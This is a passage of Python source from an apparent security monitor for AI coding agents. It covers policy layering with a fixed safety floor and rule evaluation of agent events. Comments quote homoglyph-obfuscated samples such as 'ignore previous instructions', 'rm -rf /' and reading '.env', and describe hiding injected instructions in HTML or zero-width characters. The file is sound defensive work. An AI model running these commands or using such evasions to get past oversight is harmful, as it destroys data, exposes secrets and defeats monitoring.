                # if it's a complete definition; a sparse entry (e.g. just
                # {id, mode: enforce}) that names a rule which doesn't exist is a
                # typo/no-op — ignore it with a warning rather than crash the
                # compile on missing required fields (fail-open hazard).
                _required = ("severity", "category", "title", "event_types")
                _missing = [k for k in _required if k not in rule]
                if _missing:
                    sys.stderr.write(
                        f"[prismor] Ignoring {source} override for unknown rule "
                        f"'{rule.get('id', '')}' (no such rule to override; not a "
                        f"complete new rule — missing {', '.join(_missing)})\n"
                    )
                    continue
                rules_by_id[rule["id"]] = rule
        allowlist_raw.extend(override_raw.get("allowlists", []) or [])
        override_settings = dict(override_raw.get("settings", {}) or {})
        # `selection: explicit` makes the safety floor opt-in, so it is a
        # local-only affordance for a developer's own machine. Arriving from the
        # signed org bundle (or a repo exemption overlay) it would mean an admin
        # had turned the floor off fleet-wide, which the floor exists to prevent.
        if source != "project" and "selection" in override_settings:
            sys.stderr.write(
                f"[prismor] Ignoring settings.selection from the {source} policy layer "
                f"(the safety floor stays on for managed workspaces)\n"
            )
            override_settings.pop("selection", None)
        if "block_categories" in override_settings:
            cats = set(override_settings.get("block_categories") or [])
            dropped = _CORE_BLOCK_CATEGORIES - cats
            if dropped:
                sys.stderr.write(
                    f"[prismor] {source} override dropped core block categories "
                    f"{sorted(dropped)} — restoring (cannot be weakened)\n"
                )
                override_settings["block_categories"] = sorted(cats | _CORE_BLOCK_CATEGORIES)
        # Record which layer owns the egress config. The remote (org-signed)
        # layer is applied last, so if it sets egress it wins here too — and
        # that provenance is what lets an org enforce verdict survive a local
        # observe downgrade (see EgressPolicy.evaluate / runtime.py).
        if "egress" in override_settings or "egress_allowlist" in override_settings:
            self._egress_source = source
        if "data_boundary" in override_settings:
            self._data_boundary_source = source
        settings.update(override_settings)

    def _load(self, workspace: Optional[Path], policy_path: Optional[Path]) -> None:
        default_raw = _load_yaml(_DEFAULT_POLICY_PATH)
        if default_raw is None:
            return

        # Start with default rules indexed by id.
        rules_by_id: Dict[str, Dict[str, Any]] = {}
        for rule in default_raw.get("rules", []):
            rules_by_id[rule["id"]] = rule

        allowlist_raw: List[Dict[str, Any]] = list(default_raw.get("allowlists", []) or [])

        # Settings start from defaults; project policy can extend or override.
        settings: Dict[str, Any] = dict(default_raw.get("settings", {}) or {})

        # Merge project-level override if present.
        override_path = policy_path
        if override_path is None and workspace is not None:
            candidate = workspace / ".prismor" / "policy.yaml"
            if candidate.exists():
                override_path = candidate

        if override_path is not None and override_path.exists():
            override_raw = _load_yaml(override_path)
            if override_raw is not None:
                self._apply_override(override_raw, rules_by_id, allowlist_raw, settings, "project")

        # Merge signed, org-managed remote policy (enterprise control plane).
        # Applied AFTER the project layer so an org admin's policy is
        # authoritative for settings, but the same non-overridable floor below
        # protects core rules — a remote policy can tighten, never weaken.
        # Per-workspace scoping: the org (remote) policy overlay — which also
        # carries the org telemetry sink — applies ONLY to org-managed
        # workspaces (company/client repos). Personal/local-only workspaces use
        # default + project policy only: still fully protected locally, but no
        # org policy and nothing reported to the org. The non-weakening floor is
        # unaffected (it lives in the default policy, always on).
        self.remote_policy_meta: Dict[str, Any] = {}
        self.workspace_managed: bool = False
        try:
            from prismor.runtime.enterprise import workspace_scope as _scope
            self.workspace_managed = _scope.is_managed(workspace)
        except Exception:
            self.workspace_managed = False
        self.active_exemption: Optional[Dict[str, Any]] = None
        if self.workspace_managed:
            try:
                from prismor.runtime.enterprise import remote_policy as _remote
                remote_raw = _remote.verify_and_load()
                if remote_raw is not None:
                    self.remote_policy_meta = remote_raw.pop("_remote_meta", {}) or {}
                    self._apply_override(remote_raw, rules_by_id, allowlist_raw, settings, "remote")
            except Exception as _remote_exc:  # never let policy distribution break enforcement
                sys.stderr.write(f"[prismor] remote policy load error: {_remote_exc}\n")

            # Layered policy: after the org overlay, apply a repo-scoped EXEMPTION
            # if the admin granted one for this repo. Exemptions can relax only
            # non-floor rules — they go through the SAME _apply_override that
            # enforces _NON_OVERRIDABLE_RULE_IDS + core block categories, so an
            # exemption can never weaken core protection. The matched exemption
            # id is recorded so telemetry shows the repo is running relaxed.
            self.active_exemption = self._match_exemption(workspace, settings)
            if self.active_exemption is not None:
                overlay = self.active_exemption.get("overlay") or {}
                if isinstance(overlay, dict):
                    self._apply_override(overlay, rules_by_id, allowlist_raw, settings, "exemption")

        # Compile settings.
        self.block_categories = set(settings.get("block_categories", []))
        # Org per-agent controls (kill-switch / forced mode / IAM profile per
        # named agent) from the verified signed remote policy. Only populated on
        # org-managed workspaces (the remote overlay is only merged there); the
        # runtime passes this into agents.resolve_agent_control for the
        # tighten-only merge with the local agents.yaml.
        _ac = settings.get("agent_controls")
        self.agent_controls: Dict[str, Any] = _ac if isinstance(_ac, dict) else {}
        # Per-event rule exemptions (relax/flag a rule for a specific user,
        # device, or session) from the verified signed policy. A list matched at
        # evaluation time against the current context (see runtime), NOT a
        # profile — so it works for session scope and can relax any finding,
        # including scoped-agent. Floor rules can never be exempted. Managed
        # workspaces only.
        _re = settings.get("rule_exemptions")
        self.rule_exemptions: List[Dict[str, Any]] = _re if isinstance(_re, list) else []
        # Per-tool deny/allow from the verified signed policy — a list of
        # {tool, action:'deny', scope, scopeId} the org admin set from a tool
        # call. Matched at evaluation time by tool tag + scope (see runtime).
        # Device-scoped entries are pre-filtered server-side to this device;
        # org/agent/session entries apply fleet-wide. Managed workspaces only.
        _td = settings.get("tool_denies")
        self.tool_denies: List[Dict[str, Any]] = _td if isinstance(_td, list) else []
        # Per-subject controls (suspend / tool denies for an end user or a
        # client team) from the verified signed policy — keyed ``user:<id>`` /
        # ``team:<id>``. Enforced through the IAM path: the runtime passes this
        # into iam.check_iam, which merges it tighten-only with any local
        # iam.yaml profile (see iam._merge_remote_subject_controls). Managed
        # workspaces only.
        _sc = settings.get("subject_controls")
        self.subject_controls: Dict[str, Any] = _sc if isinstance(_sc, dict) else {}
        # Tool-combination governance config (settings.tool_tags):
        # customizable tags + forbidden combinations (generalized trifecta).
        _tt = settings.get("tool_tags")
        self.tool_tags: Dict[str, Any] = _tt if isinstance(_tt, dict) else {}
        # Global observe/enforce default for rules that don't set their own mode.
        # Defaults to "observe" — a fresh policy blocks nothing until an admin
        # flips rules (or this) to enforce.
        _dm = settings.get("default_mode") or settings.get("mode") or "observe"
        self.default_mode: str = str(_dm).lower()
        # Per-device observe/enforce override, delivered in the signed policy
        # already scoped server-side to this device (see remote_policy.py /
        # the control plane's device settings). A fleet-wide kill switch for
        # one machine: wins over rule.mode and default_mode everywhere mode is
        # resolved below, but never the non-overridable enforce floor (core
        # rule IDs / core block categories / intrinsic hard-floor findings).
        _dev_mode = settings.get("device_mode")
        self.device_mode: Optional[str] = (
            str(_dev_mode).lower() if str(_dev_mode).lower() in ("observe", "enforce") else None
        )
        # Did the operator explicitly adopt the per-rule observe/enforce model?
        # Used by the backward-compat enforce bridge (see is_legacy_policy).
        self._default_mode_explicit: bool = ("default_mode" in settings) or ("mode" in settings)
        # `settings.selection: explicit` — the operator picked their blocking set
        # rule by rule in `prismor setup`, so an unselected floor rule observes
        # rather than blocks (self-protection excepted; see _resolve_mode).
        #
        # Honored only where the choice is genuinely the operator's own: an
        # unmanaged workspace with no signed org layer applied. On an org-managed
        # machine the floor is the org's to set, and a local file saying
        # otherwise is exactly the downgrade the floor defends against.
        self.explicit_selection: bool = (
            str(settings.get("selection", "")).lower() == "explicit"
            and not self.workspace_managed
            and not self.remote_policy_meta
        )
        outputs = settings.get("outputs") or []
        if isinstance(outputs, list):
            self.outputs = [o for o in outputs if isinstance(o, dict)]

        manifest_pats: List[str] = settings.get("manifest_patterns", []) or []
        if manifest_pats:
            joined = "|".join(f"(?:{p})" for p in manifest_pats)
            self._manifest_re = re.compile(joined, re.IGNORECASE)

        # Legacy flat allowlist — still read verbatim so scanner.py and any
        # external consumer keep working.
        self.egress_allowlist = list(settings.get("egress_allowlist", []) or [])
        # Full egress policy (settings.egress), falling back to the legacy list
        # with its historic warn-only semantics when only that is set.
        self.egress = EgressPolicy.from_settings(settings, source=self._egress_source)
        for _egress_err in self.egress.errors:
            sys.stderr.write(f"[prismor] egress policy: {_egress_err}\n")
        # Data boundary (settings.data_boundary): sensitive datum × destination
        # screening of outbound payloads — see prismor/runtime/data_boundary.py.
        self.data_boundary = DataBoundaryPolicy.from_settings(
            settings, source=self._data_boundary_source
        )
        for _db_err in self.data_boundary.errors:
            sys.stderr.write(f"[prismor] data_boundary policy: {_db_err}\n")
        if self.data_boundary.enabled:
            _db_raw = settings.get("data_boundary") or {}
            if isinstance(_db_raw, dict) and _db_raw.get("self_identity_auto", True):
                try:
                    from prismor.runtime.data_boundary import discover_self_identity
                    for _ident in discover_self_identity(self.workspace):
                        if _ident not in self.data_boundary.self_identity:
                            self.data_boundary.self_identity.append(_ident)
                except Exception:
                    pass
        # Keep the flat list in sync when a modern policy defines the allowlist
        # only under settings.egress, so the MCP static scanner still sees it.
        if not self.egress_allowlist and self.egress.enabled:
            self.egress_allowlist = [
                e.host for e in self.egress.allow if e.network is None and not e.any_host
            ]

        # Automatic OSV/typosquat/IOC scoring of package-manager install
        # commands found in shell events — see settings comment in
        # default_policy.yaml. On by default; an org can disable it in
        # .prismor/policy.yaml if the extra network round-trips are
        # unacceptable latency.
        # Resolve what a command actually runs (script argument, sourced file,
        # npm script, make recipe, Dockerfile) and evaluate that content too.
        # Findings are advisory until an operator promotes them -- see
        # execution_target_action.
        self.inspect_execution_targets: bool = bool(
            settings.get("inspect_execution_targets", True)
        )
        # "observe" reports without ever blocking (default, so upgrading an
        # install cannot start breaking builds). "enforce" lets a finding from
        # inspected content block exactly as an inline one would.
        self.execution_target_action: str = str(
            settings.get("execution_target_action", "observe")
        ).strip().lower()
        self.supply_chain_install_check: bool = bool(
            settings.get("supply_chain_install_check", True)
        )

        # Detective (not preventive) scan of the FULL resolved npm
        # dependency tree — including transitive sub-dependencies — run
        # once an `npm install` completes. Subordinate to
        # supply_chain_install_check: disabling that disables this too.
        # Heavier than the per-command/manifest checks (can touch
        # hundreds of packages), so it's independently toggleable. See
        # settings comment in default_policy.yaml.
        self.supply_chain_transitive_scan: bool = bool(
            settings.get("supply_chain_transitive_scan", True)
        )

        # Action for MCP remote-transport static findings (cleartext transport,
        # raw-IP endpoints, off-allowlist endpoints, hardcoded secrets in
        # headers/env). Either "warn" (default) or "block".
        _mcp_action = str(settings.get("mcp_transport_action", "warn")).lower()
        self.mcp_transport_action = _mcp_action if _mcp_action in ("warn", "block", "log") else "warn"

        # Hybrid semantic prompt-injection layer (opt-in).
        sg = settings.get("semantic_guard") or {}
        if isinstance(sg, dict):
            self.semantic_guard_config = sg

        sandbox = settings.get("sandbox") or {}
        if isinstance(sandbox, dict):
            self.sandbox_config = sandbox

        # Compile rules.
        for rule_data in rules_by_id.values():
            if rule_data.get("enabled", True):
                self.rules.append(CompiledRule(rule_data))

        for al_data in allowlist_raw:
            self.allowlists.append(AllowlistEntry(al_data))

    def _is_manifest(self, path: str) -> bool:
        if not path or self._manifest_re is None:
            return False
        return bool(self._manifest_re.search(path))

    def evaluate(
        self,
        event: Dict[str, Any],
        index: int,
        session_id: str = "",
        subject: Optional[Any] = None,
    ) -> List[Dict[str, Any]]:
        """Evaluate a single event against all loaded rules. Returns findings.

        ``subject`` is the resolved end-user principal (``prismor.runtime.principal.Subject``);
        when supplied, each finding is tagged with it so per-user policy scoping,
        telemetry, and the dashboard can attribute the call to a specific user.
        """
        event_type = str(event.get("type", "")).lower()
        if not event_type:
            return []

        subject_dict = subject.as_dict() if subject is not None else None

        # Pre-extract fields that rules might match against.
        field_values = _extract_fields(event)
        findings: List[Dict[str, Any]] = []

        # An MCP tool call classifies as `network` (remote) or `tool_result`
        # (stdio); the `mcp` event alias lets a custom rule target both without
        # knowing which. An event is MCP iff the normalizer tagged its server.
        is_mcp_event = bool(event.get("mcp_server"))

        # Memoized ASCII-folds of field values, shared across all rules for this
        # event. Without this the fold is recomputed per rule (up to 70x for the
        # same 64KB memory blob). Populated lazily — an all-ASCII event never
        # folds anything. Maps field name -> folded text, or None when folding
        # changed nothing (so the evasion rescan can skip it).
        folded_cache: Dict[str, Optional[str]] = {}

        def _folded(field_name: str, value: str) -> Optional[str]:
            if field_name not in folded_cache:
                folded = _fold_confusables(value)
                folded_cache[field_name] = folded if folded != value else None
            return folded_cache[field_name]

        for rule in self.rules:
            matched_via_mcp_alias = False
            # A synthetic "text" event has no rules of its own; route it through
            # the agent-I/O content rules so check_text / `--type text` actually
            # validate arbitrary text. See PrismorSec/prismor#163.
            if event_type == "text":
                if _TEXT_CONTENT_TYPES.isdisjoint(rule.event_types):
                    continue
            elif event_type in rule.event_types:
                pass
            elif is_mcp_event and "mcp" in rule.event_types:
                # Rule opted into the MCP alias and this is an MCP call.
                matched_via_mcp_alias = True
            else:
                continue

            # Determine which fields to check. A rule matched purely via the
            # `mcp` alias (and naming no explicit fields) defaults to the tool
            # tag, not the event type's canonical field.
            if rule.fields:
                check_fields = rule.fields
            elif matched_via_mcp_alias:
                check_fields = _MCP_ALIAS_DEFAULT_FIELDS
            else:
                check_fields = _DEFAULT_FIELDS.get(event_type, [])
            matched_evidence = None
            folded_evidence = None
            evasion = None

            if rule.condition is not None:
                # Opt-in path: boolean expression over named pattern groups.
                # Evaluated across all checked fields at once, since a condition
                # like "exfil_verb and secret_ref" may legitimately be satisfied
                # by two different fields of the same event.
                matched_evidence = rule.evaluate_condition(
                    [field_values.get(f, "") for f in check_fields])
            else:
                for field_name in check_fields:
                    value = field_values.get(field_name, "")
                    if not value:
                        continue
                    if rule.patterns.search(value):
                        matched_evidence = value
                        break

            if matched_evidence is None:
                # Homoglyph / invisible-character evasion rescan. Every rule
                # pattern matches literal ASCII, so `іgnore previous
                # instructions` (Cyrillic і) or `r​m -rf /` slips past the
                # scan above. Re-run against an ASCII-folded copy so the rule
                # that *should* have fired does.
                #
                # Deliberately a fallback, not a replacement: the raw scan runs
                # first and is untouched, so no input that matches today can
                # change classification. `isascii()` is a C-level check, which
                # keeps this at roughly zero cost on the overwhelmingly common
                # all-ASCII path — folding only ever runs on non-ASCII text
                # that already failed to match.
                if rule.condition is not None:
                    folded_fields = [
                        (_folded(f, v) or v) if (v and not v.isascii()) else v
                        for f, v in ((f, field_values.get(f, "")) for f in check_fields)
                    ]
                    hit = rule.evaluate_condition(folded_fields)
                    if hit is not None and any(
                        v and not v.isascii() for v in
                        (field_values.get(f, "") for f in check_fields)
                    ):
                        # Report the original text for whichever field the fold
                        # produced this evidence from.
                        originals = [field_values.get(f, "") for f in check_fields]
                        matched_evidence = next(
                            (o for o, f in zip(originals, folded_fields) if f == hit), hit)
                        folded_evidence = hit
                        evasion = "unicode_obfuscation"
                else:
                    for field_name in check_fields:
                        value = field_values.get(field_name, "")
                        if not value or value.isascii():
                            continue
                        folded = _folded(field_name, value)
                        if folded is not None and rule.patterns.search(folded):
                            # Evidence stays the ORIGINAL text — operators need
                            # to see the bytes that arrived, not our fold.
                            matched_evidence = value
                            folded_evidence = folded
                            evasion = "unicode_obfuscation"
                            break

            if matched_evidence is None:
                continue

            # Check allowlist.
            if self._is_allowlisted(rule.id, matched_evidence):
                continue

            # Per-rule severity overrides (configured in YAML, not hardcoded).
            severity = rule.severity
            if rule.severity_on_write and event_type == "file_write":
                severity = rule.severity_on_write
            if rule.severity_on_manifest and self._is_manifest(field_values.get("path", "")):
                severity = rule.severity_on_manifest

            # Contextual verification: a pattern can match inside an inert
            # string literal -- a commit message, a PR body, a grep pattern --
            # where it describes an action rather than performing one. Such a
            # finding is still reported, but never blocks. See
            # shell_context.is_inert_match for the conditions, all of which
            # must hold; anything ambiguous keeps its blocking verdict.
            context_inert = False
            if event_type == "shell" and matched_evidence:
                try:
                    from prismor.runtime.shell_context import (
                        is_inert_match, is_remote_payload)
                    _m = rule.patterns.search(matched_evidence)
                    if _m is not None:
                        context_inert = is_inert_match(
                            matched_evidence, _m.start(), _m.end()
                        )
                        # A self-protection rule guards THIS install. When the
                        # match sits inside an ssh/docker/kubectl payload it
                        # describes another machine's Prismor, which this policy
                        # does not govern and whose remediation ("run it
                        # yourself") cannot help. Report it, do not block it.
                        # Scoped to these rules on purpose: a remote `rm -rf /`
                        # still destroys a real machine (issue #344).
                        if not context_inert and rule.id in _LOCAL_JURISDICTION_RULE_IDS:
                            context_inert = is_remote_payload(
                                matched_evidence, _m.start(), _m.end()
                            )
                except Exception as exc:  # never let context checking drop a finding
                    sys.stderr.write(f"[prismor] context check error: {exc}\n")
                    context_inert = False

            finding_id = f"{rule.id}-{index}"
            prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id

            finding = {
                "id": prefixed_id,
                "severity": severity,
                "category": rule.category,
                "title": rule.title,
                "evidence": _truncate(matched_evidence),
                # Which of the rule's patterns fired — static policy text (never
                # event content), so telemetry may carry it even when redacted.
                # Attributed against the folded copy when that is what matched,
                # otherwise the pattern would re-scan text it cannot match.
                "pattern": rule.matched_pattern(folded_evidence or matched_evidence),
                "eventIndex": index,
                "ruleId": rule.id,
                "action": rule.action,
                "transform": rule.transform,
                "subject": subject_dict,
                # Provenance of the authorizing instruction — lets telemetry and
                # the dashboard distinguish a directive from live user input,
                # untrusted tool output, or project memory (issue #155).
                "source": _EVENT_SOURCE.get(event_type, event_type),
                # Effective observe/enforce for this finding — see _resolve_mode.
                "mode": self._resolve_mode(rule),
                # True when the match sits in inert text rather than executable
                # position. should_block() never blocks on such a finding.
                "contextInert": context_inert,
            }

            # Only present when the rule matched an ASCII-folded copy rather
            # than the raw text — i.e. the payload was deliberately obfuscated.
            # Added conditionally so the finding shape is byte-identical to
            # before for every non-evasion match. The value is a fixed constant,
            # never event content, so redacted telemetry may carry it.
            if evasion:
                finding["evasion"] = evasion

            findings.append(finding)

        # ── Execution-target content inspection ─────────────────────────
        # A rule only sees the command string, so `bash deploy.sh` is opaque no
        # matter what the script holds. Resolve what the command would actually
        # run and evaluate those lines too. Observe-only by default: findings
        # are reported with `contextInert` semantics and an `execTarget` origin,
        # but never block, until the real false-positive rate is known from
        # fleet telemetry. Enable blocking per-category once warmed up.
        if event_type == "shell" and self.inspect_execution_targets:
            _cmd = field_values.get("command", "")
            if _cmd:
                try:
                    findings.extend(
                        self._check_execution_targets(_cmd, index, session_id, subject_dict)
                    )
                except Exception as exc:
                    sys.stderr.write(f"[prismor] execution target check error: {exc}\n")

        # ── Indirect command bypass: inspect executed script contents (#27) ─
        # A shell rule matches only the command string, so `bash ./vendor/x.sh`
        # hides whatever the script body does. Resolve each invoked script
        # inside the workspace and evaluate its body line-by-line as synthetic
        # shell events, so the script is judged by the same rules as a typed
        # command. Fail-open: any resolution/read error skips silently.
        # Pre-action only — post-action re-reads would duplicate every finding
        # and cannot stop an exec that already happened.
        if (
            event_type == "shell"
            and self.workspace is not None
            and event.get("_script_depth", 0) < _MAX_SCRIPT_DEPTH
            and _is_pre_action_event(event)
        ):
            _cmd = field_values.get("command", "")
            if _cmd:
                try:
                    findings.extend(
                        self._scan_invoked_script_contents(
                            event, _cmd, index, session_id, subject,
                            depth=int(event.get("_script_depth", 0)),
                            seen=event.get("_script_seen"),
                        )
                    )
                except Exception as exc:
                    sys.stderr.write(f"[prismor] script-content inspection error: {exc}\n")

        # ── Supply-chain install risk (OSV CVEs, typosquat, IOC) ────────
        # Wires the same scoring `prismor supplychain npm install <pkg>`
        # runs explicitly into the automatic hook path, so a plain
        # `npm install lodash@4.17.4` an agent runs on its own — without
        # being told to route through that wrapper — gets checked too.
        # Skipped for synthetic script lines: this does network-backed OSV /
        # typosquat lookups, which must not fire once per line of a script.
        if event_type == "shell" and self.supply_chain_install_check and not event.get("_script_line"):
            _cmd = field_values.get("command", "")
            if _cmd:
                try:
                    findings.extend(self._check_supply_chain(_cmd, index, session_id))
                except Exception as exc:
                    sys.stderr.write(f"[prismor] supply chain check error: {exc}\n")

        # ── Supply-chain risk from a manifest edit (not just the install
        # command) ───────────────────────────────────────────────────
        # An agent commonly pins a vulnerable version by editing the
        # manifest directly, then runs a bare install with no package
        # arguments — which the command-based check above cannot see,
        # since a bare install resolves from the manifest, not argv.
        # Scan the text being written for pinned dependency entries and
        # score those too. Covers npm/pnpm/yarn (package.json), pip
        # (requirements*.txt, pyproject.toml), go (go.mod), and cargo
        # (Cargo.toml). See _manifest_ecosystem for what's intentionally
        # out of scope (maven).
        if event_type == "file_write" and self.supply_chain_install_check:
            _path = field_values.get("path", "")
            _content = str(event.get("content", ""))
            _eco = _manifest_ecosystem(_path)
            if _content and _eco:
                try:
                    findings.extend(
                        self._check_manifest_write(_content, _eco, index, session_id)
                    )
                except Exception as exc:
                    sys.stderr.write(f"[prismor] supply chain manifest check error: {exc}\n")

        # ── Transitive lockfile-tree scan (post-install, detective) ─────
        # The resolved dependency tree (including sub-dependencies a
        # direct command/manifest check never sees) only exists once an
        # install has actually completed, so this fires on a post-action
        # event and only ever warns — should_block() only blocks on
        # pre-action events, so there is no pre-action path through which
        # this finding could block anything even if mis-tagged.
        if (
            event_type == "shell"
            and self.supply_chain_install_check
            and self.supply_chain_transitive_scan
            and str(event.get("agent_event", "")).lower().startswith("post")
        ):
            _cmd = field_values.get("command", "")
            if _cmd and _is_completed_npm_install(_cmd):
                try:
                    findings.extend(self._check_transitive_postinstall(index, session_id))
                except Exception as exc:
                    sys.stderr.write(f"[prismor] transitive supply chain check error: {exc}\n")

        # ── Canarytoken access check ────────────────────────────────────
        # If the agent is reading a registered canarytoken path, raise a
        # CRITICAL finding — canaries are fake credentials planted as honey
        # tokens, so any read is by definition unauthorized reconnaissance.
        if event_type in ("file_read", "file_write"):
            _path = field_values.get("path", "")
            if _path:
                try:
                    from prismor.runtime.canary import check_path_is_canary, beacon
                    hit = check_path_is_canary(_path.split("\n", 1)[0])
                    if hit:
                        finding_id = f"canary-access-{index}"
                        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                        findings.append({
                            "id": prefixed_id,
                            "severity": "CRITICAL",
                            "category": "secret_access",
                            "title": f"Canarytoken accessed: {hit['type']} token at {hit['path']}",
                            "evidence": _truncate(_path),
                            "eventIndex": index,
                            "ruleId": "canary-access",
                            "action": "block",
                        })
                        beacon(hit, f"canary-{event_type}", {"session": session_id})
                except Exception:
                    pass

        # ── Prismor vault access guard ──────────────────────────────────
        # The plaintext secret vault (~/.prismor/secrets, or wherever
        # PRISMOR_SECRETS_DIR points) must never be touched by an agent tool
        # call. Resolving the live path honors env overrides that a static
        # YAML pattern would silently miss. Cloaking's own decloak/recloak
        # hooks read the vault via bash `cat` outside hook-dispatch, so they
        # never reach evaluate() — only an agent reading the vault trips this.
        try:
            from prismor.runtime.cloaking.secrets_store import secrets_dir as _secrets_dir
            # normpath+expanduser (not resolve) so both sides normalize the same
            # way — avoids symlink mismatches like macOS /var → /private/var.
            _vault = os.path.normpath(os.path.expanduser(str(_secrets_dir())))
        except Exception:
            _vault = ""
        if _vault:
            _hit_vault = None
            if event_type in ("file_read", "file_write"):
                _p = field_values.get("path", "")
                if _p:
                    _np = os.path.normpath(os.path.expanduser(_p.split("\n", 1)[0]))
                    if _np == _vault or _np.startswith(_vault + os.sep):
                        _hit_vault = _p
            elif event_type == "shell":
                _cmd = field_values.get("command", "")
                # ".prismor/secrets" matches every expansion form of the default
                # location (~/, $HOME/, absolute); _vault matches a custom dir.
                if _cmd and (".prismor/secrets" in _cmd or _vault in _cmd):
                    _hit_vault = _cmd
            if _hit_vault is not None:
                finding_id = f"prismor-vault-access-{index}"
                prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                findings.append({
                    "id": prefixed_id,
                    "severity": "CRITICAL",
                    "category": "secret_access",
                    "title": "Access to Prismor plaintext secret vault",
                    "evidence": _truncate(_hit_vault),
                    "eventIndex": index,
                    "ruleId": "prismor-vault-access",
                    "action": "block",
                })

        # Canary marker found in tool stdout/stderr (PostToolUse content
        # scanning) — catches the case where the canary is read indirectly.
        _combined = field_values.get("combined_text", "")
        if _combined:
            try:
                from prismor.runtime.canary import check_content_for_markers, get_markers
                if get_markers():  # cheap guard to avoid the scan when nothing registered
                    marker = check_content_for_markers(_combined)
                    if marker:
                        finding_id = f"canary-marker-{index}"
                        prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                        findings.append({
                            "id": prefixed_id,
                            "severity": "CRITICAL",
                            "category": "secret_access",
                            "title": "Canarytoken marker detected in tool output",
                            "evidence": f"marker={marker[:24]}…",
                            "eventIndex": index,
                            "ruleId": "canary-marker",
                            "action": "block",
                        })
            except Exception:
                pass

        # ── Homoglyph / Unicode-confusable path check ────────────────────
        # Catches cases like `cat .еnv` where .еnv uses a Cyrillic 'е'
        # (U+0435) instead of Latin 'e' — bypasses every regex rule that
        # matches on literal ASCII strings. Evaluated for shell commands
        # and any file event; triggers whether or not another rule fired.
        for _field in ("command", "path", "url"):
            _val = field_values.get(_field, "")
            if _val and _has_suspicious_unicode(_val):
                finding_id = f"unicode-confusable-{index}"
                prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                findings.append({
                    "id": prefixed_id,
                    "severity": "HIGH",
                    "category": "path_traversal",
                    "title": "Path or command contains Unicode-confusable characters (homoglyph bypass)",
                    "evidence": _truncate(_val),
                    "eventIndex": index,
                    "ruleId": "unicode-confusable",
                    "action": "warn",
                })
                break  # one finding per event is enough

        # ── Invisible-char check for skill content ─────────────────────────
        # Zero-width characters in a skill manifest have no legitimate use —
        # they are used to embed hidden instructions that survive rendering.
        # We check combined_text here (where skill content lives) rather than
        # command/path/url, which the block above already handles.
        if event_type == "skill_manifest":
            _skill_text = field_values.get("combined_text", "")
            if _skill_text and _has_invisible_chars(_skill_text):
                finding_id = f"skill-invisible-chars-{index}"
                prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
                findings.append({
                    "id": prefixed_id,
                    "severity": "HIGH",
                    "category": "skill_risk",
                    "title": "Skill content contains invisible zero-width characters (possible hidden instruction injection)",
                    "evidence": f"Invisible Unicode found in skill manifest content",
                    "eventIndex": index,
                    "ruleId": "skill-invisible-chars",
                    "action": "warn",
                })

        # ── Egress policy ───────────────────────────────────────────────
        # Destination-driven, not pattern-driven: every network event and every
        # shell command is decomposed into concrete (host, port, scheme) tuples
        # and screened against settings.egress. Handles URLs of any scheme,
        # user@host:path, bare curl/wget hosts, and nc/telnet host-port pairs —
        # see prismor/runtime/egress.py. A legacy settings.egress_allowlist is
        # honored with its original warn-only semantics.
        #
        # Synthetic script lines are skipped: an inspected script with a URL on
        # every line would otherwise emit one egress finding per line.
        if self.egress.enabled and not event.get("_script_line"):
            try:
                findings.extend(self.egress.evaluate(
                    event,
                    index,
                    session_id=session_id,
                    agent_name=str(event.get("agent_name") or event.get("agent") or ""),
                    default_mode=self.default_mode,
                    device_mode=self.device_mode,
                ))
            except Exception as _egress_exc:  # never let egress screening break evaluation
                sys.stderr.write(f"[prismor] egress evaluation error: {_egress_exc}\n")

        # ── Data boundary: what is being sent, and to whom ─────────────────
        # Sensitive datum × destination tier. Runs after egress so an explicit
        # egress deny can mark the destination untrusted, and reads the session's
        # doc/skill provenance so a call induced by a just-fetched SKILL.md is
        # annotated (and nudged one rung) — see data_boundary.py.
        _db_taint = None
        if self.data_boundary.enabled and not event.get("_script_line") and event_type in ("network", "shell"):
            try:
                _db_taint = self._get_taint(session_id)
                _prov = _db_taint.latest_source(index) if _db_taint is not None else None
                findings.extend(self.data_boundary.evaluate(
                    event,
                    index,
                    session_id=session_id,
                    egress_findings=[f for f in findings if f.get("egressHost")],
                    default_mode=self.default_mode,
                    device_mode=self.device_mode,
                    provenance=_prov,
                    installed_this_session=set(_db_taint.installed) if _db_taint is not None else None,
                    first_seen=_db_taint.is_new_domain if _db_taint is not None else None,
                ))
            except Exception as _db_exc:  # never let data-boundary screening break evaluation
                sys.stderr.write(f"[prismor] data_boundary evaluation error: {_db_exc}\n")

        # ── Provenance bookkeeping: doc/skill loads and installs ───────────
        # Cheap and detection-independent: record where instructions came from
        # so later findings can say "following SKILL.md from <host>".
        if not event.get("_script_line") and session_id:
            try:
                from prismor.runtime.data_boundary import (
                    doc_source_from_event, installed_binaries_from_command,
                )
                _src = doc_source_from_event(event)
                _inst = (
                    installed_binaries_from_command(str(event.get("command") or ""))
                    if event_type == "shell" else set()
                )
                if _db_taint is None and (_src or _inst or findings):
                    _db_taint = self._get_taint(session_id)
                if _db_taint is not None:
                    # Annotate this event's own findings with the freshest prior
                    # source (e.g. the supply-chain warning on `npm i -g` that a
                    # doc told the agent to run) — before recording this event
                    # as a source itself.
                    if findings and event_type in ("shell", "file_write", "network", "tool_result"):
                        _prev = _db_taint.latest_source(index)
                        if _prev:
                            for _f in findings:
                                _f.setdefault("provenance", {
                                    "kind": _prev.get("kind"), "ref": _prev.get("ref"),
                                    "host": _prev.get("host"), "eventIndex": _prev.get("index"),
                                })
                    if _inst:
                        _db_taint.add_installed(_inst)
                    if _src:
                        _db_taint.add_source(_src["kind"], _src["ref"], _src.get("host", ""), index)
                # Shell destinations count as "seen" for first-seen logic.
                if event_type == "shell" and _db_taint is not None:
                    for _dom in _extract_domains_from_command(str(event.get("command") or "")):
                        _db_taint.add_domain(_dom)
            except Exception:
                pass

        # ── Prompt injection: structural HTML analysis (sanitizer) ─────────
        # The YAML rules match injection keywords in plaintext. This pass
        # catches payloads that survive because they are wrapped in HTML
        # comments, hidden via CSS, or fragmented by zero-width characters.
        # We call the sanitizer on the raw response field (not combined_text)
        # so the HTML structure is intact.
        if event_type == "tool_result":
            raw_response = str(event.get("response", ""))
            if raw_response:
                try:
                    from prismor.runtime.sanitizer import detect_injections as _detect_html
                    _html_detections = _detect_html(raw_response)
                    for _det in _html_detections:
                        finding_id = f"html-injection-{index}"
